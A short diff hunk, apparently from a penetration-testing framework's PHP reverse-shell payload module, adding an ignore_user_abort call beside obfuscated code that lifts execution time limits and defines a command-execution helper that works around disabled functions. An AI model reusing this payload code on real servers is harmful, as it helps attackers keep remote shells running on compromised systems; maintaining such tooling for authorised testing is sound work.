@@ -97,6 +97,7 @@ module ReversePhp
 			$disabled=array();
 		}
 		@set_time_limit(0);
+		@ignore_user_abort(1);
 		@ini_set($m.$a.$x.$_.$e.$x.$e.$c.$u.$t.$i.$o.$n.$_.$t.$i.$m.$e,0);
 		function myexec($cmd){
 			global$disabled,$_,$a,$c,$e,$h,$m,$n,$o,$p,$r,$s,$t,$u,$x,$y;
